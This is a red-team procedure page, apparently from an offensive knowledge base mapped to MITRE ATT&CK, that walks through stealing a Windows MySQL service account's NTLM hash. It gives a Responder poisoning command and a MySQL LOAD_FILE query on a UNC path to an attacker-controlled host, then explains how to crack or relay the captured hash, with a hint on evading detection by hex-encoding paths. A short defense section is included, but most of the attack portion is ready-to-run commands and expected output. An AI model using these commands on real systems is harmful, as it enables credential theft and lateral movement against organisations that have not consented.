---
id: e1e466e7-0b98-4dc8-834d-9c0ae115d624
name: MySQL-Out-of-Band-UNC-Path-NTLM-Hash-Stealing
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:35.076838Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
  - '[[techniques/Adversary-in-the-Middle|T1557 - Adversary-in-the-Middle]]'
sub_techniques: []
tags:
  - '[[tags/MySQL Injection]]'
  - '[[tags/MySQL Out of Band]]'
  - '[[tags/UNC Path - NTLM Hash Stealing]]'
  - ntlm-relay
  - sql-injection
commands:
  - '[[commands/start-responder-ntlm-capture]]'
  - '[[commands/mysql-execute-unc-load-file]]'
platforms:
  - Windows
  - Linux
tools:
  - '[[tools/Responder]]'
validated: true
---

# MySQL-Out-of-Band-UNC-Path-NTLM-Hash-Stealing

## Summary

This procedure demonstrates how to steal NTLM hashes from a Windows-based MySQL server using out-of-band UNC path injection. By executing SQL queries that reference a UNC path controlled by the attacker, the MySQL server is forced to authenticate over SMB to the attacker's listener, leaking the NTLM hash of the MySQL service account. This technique is useful in scenarios where an attacker has SQL execution capabilities on a vulnerable MySQL instance and can receive inbound SMB connections from the target network.

## Description

MySQL on Windows supports UNC paths in functions like LOAD_FILE(), INTO DUMPFILE, and LOAD DATA INFILE, allowing an attacker with SQL injection access or database credentials to trigger an SMB authentication request to an attacker-controlled server. When the MySQL server attempts to access the UNC path (e.g., \\attacker_ip\share), it sends its NTLM credentials, which the attacker captures using a tool like Responder. The captured hash can then be cracked offline or relayed for further exploitation, such as lateral movement or privilege escalation. This out-of-band technique bypasses in-band data exfiltration limitations and is effective against MySQL versions running on Windows where SMB is enabled. Prerequisites include network reachability from the MySQL server to the attacker's IP on port 445 and no SMB signing enforced.

## Requirements

1. Valid credentials or SQL injection vulnerability granting execute access to the MySQL database on a Windows host.
2. Attacker machine reachable from the MySQL server over the network (port 445/TCP open inbound).
3. Tools installed for SMB hash capture (e.g., Responder) and MySQL client for query execution.
4. MySQL server running on Windows with UNC path support enabled (default behavior).

## Defense

Defensive measures and detection strategies:

- Disable UNC path resolution in MySQL configuration or run MySQL under a low-privilege account without network access.
- Implement network segmentation to block outbound SMB (port 445) from database servers to untrusted IPs.
- Enable SMB signing and monitor for anomalous NTLM authentication attempts using tools like Windows Event Logs (Event ID 4624) or network IDS signatures for SMBv1/2 hash challenges.
- Use web application firewalls (WAF) to detect SQL injection payloads containing UNC paths in queries.
- Regularly audit MySQL logs for suspicious LOAD_FILE or INTO OUTFILE usage and enforce least-privilege for database service accounts.

## Objectives

1. Force the MySQL server to authenticate to an attacker-controlled SMB endpoint via UNC path injection.
2. Capture the NTLM hash of the MySQL service account for offline cracking or relaying.
3. Enable further lateral movement or privilege escalation using the stolen credentials.

## Instructions

### Step 1: Set Up SMB Listener for NTLM Capture

**Context**: Prepare the attacker's machine to listen for incoming SMB connections and capture NTLM authentication attempts. This step uses Responder to poison LLMNR/NBT-NS and capture hashes without requiring the target to resolve a specific hostname.

**Command** ([[commands/start-responder-ntlm-capture]]):

```bash
responder -I $_INTERFACE -wrd
```

> This command starts Responder in listening mode on the specified network interface, enabling WPAD, LLMNR, NBT-NS, and MDNS poisoning to capture NTLMv1/v2 hashes from SMB requests. Monitor the Responder output for incoming authentication attempts triggered by the SQL injection.

### Step 2: Execute UNC Path Injection Query

**Context**: Use the MySQL client to inject a SQL query that triggers an SMB request to the attacker's UNC path. Replace placeholders with your attacker IP and a fake share name. This forces the MySQL server to authenticate, leaking the NTLM hash.

**Command** ([[commands/mysql-execute-unc-load-file]]):

```bash
mysql -h $_MYSQL_HOST -u $_USERNAME -p$_PASSWORD -e "select load_file('\\\\$_ATTACKER_IP\\fake_share');"
```

> The LOAD_FILE function attempts to read from the UNC path, prompting an SMB connection. If successful, no data is read (since the share doesn't exist), but the authentication hash is captured by the listener from Step 1. Expected output may show a file read error, but check the Responder logs for the captured hash. For evasion, use hex-encoded paths as shown in the related code snippet [[codes/MySQL-UNC-Path-Load-File-Queries]].

### Step 3: Verify and Process Captured Hash

**Context**: Confirm the NTLM hash was captured and prepare it for cracking or relaying. This step validates success and outlines next actions.

**Instructions**: Review Responder's logs (typically in /usr/share/responder/logs/) for NTLMv2 challenge-response hashes. If a hash is captured, export it to Hashcat format for offline cracking using a wordlist of potential service account passwords.

**Expected Output**: Responder console or logs show something like:

[MDNS] Poisoned answer sent to 192.168.1.100 for name 'fake_share' (request)
[SMB] NTLMv2 Hash: DOMAIN::MYDBSERVICE$::abc123:1122334455667788:...

**Success Indicators**:
- NTLM hash appears in Responder output tied to the MySQL server's IP.
- MySQL query returns an error like "Error reading file" without crashing the session.
